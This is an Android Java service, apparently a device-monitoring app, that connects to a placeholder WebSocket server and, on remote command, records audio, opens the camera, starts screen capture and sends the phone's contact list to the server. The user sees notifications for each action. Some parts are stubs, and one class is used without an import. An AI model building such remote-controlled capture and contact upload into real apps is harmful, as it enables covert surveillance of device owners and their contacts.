package com.example.monitorapp;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraManager;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.io.IOException;
import java.net.URI;

public class MonitoringService extends Service {
    private static final String TAG = "MonitoringService";
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "MonitoringChannel";
    private WebSocketClient webSocketClient;
    private MediaRecorder audioRecorder;
    private MediaProjection mediaProjection;

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(NOTIFICATION_ID, createNotification("Serviço de monitoramento iniciado"));
        setupWebSocket();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            switch (intent.getAction()) {
                case "START_AUDIO":
                    startAudioRecording();
                    break;
                case "START_VIDEO":
                    startVideoRecording();
                    break;
                case "START_SCREEN":
                    startScreenRecording(intent);
                    break;
                case "GET_CONTACTS":
                    sendContacts();
                    break;
            }
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if (webSocketClient != null) webSocketClient.close();
        stopAudioRecording();
        super.onDestroy();
    }

    // Configuração do WebSocket
    private void setupWebSocket() {
        URI uri;
        try {
            uri = new URI("ws://SEU_IP_OU_DOMINIO:3000"); // Substitua pelo IP ou domínio do seu servidor
        } catch (Exception e) {
            Log.e(TAG, "Erro na URI do WebSocket: " + e.getMessage());
            return;
        }

        webSocketClient = new WebSocketClient(uri) {
            @Override
            public void onOpen(ServerHandshake handshakedata) {
                Log.d(TAG, "WebSocket conectado");
                sendMessage("Dispositivo conectado");
            }

            @Override
            public void onMessage(String message) {
                Log.d(TAG, "Comando recebido: " + message);
                handleCommand(message);
            }

            @Override
            public void onClose(int code, String reason, boolean remote) {
                Log.d(TAG, "WebSocket fechado: " + reason);
            }

            @Override
            public void onError(Exception ex) {
                Log.e(TAG, "Erro no WebSocket: " + ex.getMessage());
            }
        };
        webSocketClient.connect();
    }

    private void sendMessage(String message) {
        if (webSocketClient != null && webSocketClient.isOpen()) {
            webSocketClient.send(message);
        }
    }

    // Captura de Áudio
    private void startAudioRecording() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Permissão de áudio não concedida");
            return;
        }
        audioRecorder = new MediaRecorder();
        audioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        audioRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        audioRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/audio_recording.mp4");
        audioRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        try {
            audioRecorder.prepare();
            audioRecorder.start();
            sendNotification("Gravando áudio agora");
            sendMessage("Áudio iniciado");
        } catch (IOException e) {
            Log.e(TAG, "Erro ao gravar áudio: " + e.getMessage());
        }
    }

    private void stopAudioRecording() {
        if (audioRecorder != null) {
            audioRecorder.stop();
            audioRecorder.release();
            audioRecorder = null;
            sendMessage("Áudio finalizado");
        }
    }

    // Captura de Vídeo (simplificado)
    private void startVideoRecording() {
        CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            String cameraId = cameraManager.getCameraIdList()[0];
            cameraManager.openCamera(cameraId, new android.hardware.camera2.CameraDevice.StateCallback() {
                @Override
                public void onOpened(android.hardware.camera2.CameraDevice camera) {
                    sendNotification("Gravando vídeo agora");
                    sendMessage("Vídeo iniciado");
                    // Adicione lógica de captura aqui
                }

                @Override
                public void onDisconnected(android.hardware.camera2.CameraDevice camera) {}
                @Override
                public void onError(android.hardware.camera2.CameraDevice camera, int error) {}
            }, null);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao gravar vídeo: " + e.getMessage());
        }
    }

    // Captura de Tela
    private void startScreenRecording(Intent intent) {
        MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        int resultCode = intent.getIntExtra("resultCode", -1);
        Intent data = intent.getParcelableExtra("data");
        if (resultCode == Activity.RESULT_OK && data != null) {
            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
            sendNotification("Gravando tela agora");
            sendMessage("Tela iniciada");
            // Configurar gravação ou streaming aqui
        }
    }

    // Acesso a Contatos
    private void sendContacts() {
        StringBuilder contacts = new StringBuilder();
        android.database.Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int phoneIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                if (nameIndex >= 0 && phoneIndex >= 0) {
                    String name = cursor.getString(nameIndex);
                    String phone = cursor.getString(phoneIndex);
                    contacts.append("Nome: ").append(name).append(", Telefone: ").append(phone).append("\n");
                } else {
                    Log.e(TAG, "Coluna não encontrada");
                }
            }
            cursor.close();
        }
        sendNotification("Acessando contatos agora");
        sendMessage("Contatos: " + contacts);
    }

    // Processar Comandos do Servidor
    private void handleCommand(String command) {
        switch (command) {
            case "start_audio":
                startAudioRecording();
                break;
            case "stop_audio":
                stopAudioRecording();
                break;
            case "start_video":
                startVideoRecording();
                break;
            case "start_screen":
                Intent broadcastIntent = new Intent("START_SCREEN_CAPTURE");
                sendBroadcast(broadcastIntent);
                break;
            case "get_contacts":
                sendContacts();
                break;
        }
    }

    // Notificação ao Usuário
    private Notification createNotification(String message) {
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Monitoring Service", NotificationManager.IMPORTANCE_LOW);
            nm.createNotificationChannel(channel);
        }
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Monitoramento Ativo")
                .setContentText(message)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
    }

    private void sendNotification(String message) {
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        nm.notify(NOTIFICATION_ID, createNotification(message));
    }
}